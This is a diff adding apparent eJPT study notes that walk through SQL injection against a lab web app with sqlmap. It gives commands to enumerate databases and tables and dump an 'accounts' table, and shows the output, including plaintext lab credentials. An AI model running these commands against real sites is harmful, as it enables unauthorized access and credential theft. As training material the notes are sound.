@@ -1,0 +1,47 @@
+[eJPT][sqlmap]SQLMap Usage
+
+
+1) First, find out the breach point, such as http://10.124.211.96/newsdetails.php?id=26.
+
+
+2) Second, determine the databases:
+# sqlmap -u http://10.124.211.96/newsdetails.php?id=26 --dbs
+----------------------------------------------------------------------------
+[13:29:06] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 4.1
+[13:29:07] [INFO] fetching database names
+available databases [2]:
+[*] awd
+[*] information_schema
+----------------------------------------------------------------------------
+
+
+3) Third, determine tables:
+# sqlmap -u http://10.124.211.96/newsdetails.php?id=26 -D awd --tables
+----------------------------------------------------------------------------
+[13:30:37] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 4.1
+[13:30:37] [INFO] fetching tables for database: 'awd'
+Database: awd
+[3 tables]
++----------+
+| accounts |
+| awards   |
+| news     |
++----------+
+----------------------------------------------------------------------------
+
+
+4) Forth, dump a table's data:
+# sqlmap -u http://10.124.211.96/newsdetails.php?id=26 -D awd -T accounts --dump
+----------------------------------------------------------------------------
+Database: awd                                                                                                                                   
+Table: accounts
+[11 entries]
++------+-----------------------------------------------------+-------------+-------------------+
+| id   | email                                               | password    | displayname       |
++------+-----------------------------------------------------+-------------+-------------------+
+| 1    | admin@awdmgmt.labs                                  | S3cr3tBOFH  | Admin             |
+| 2    | porta.elit.a@adipiscingMaurismolestie.net           | VUH74DYX6DO | Mallory Reed      |
+...
+----------------------------------------------------------------------------
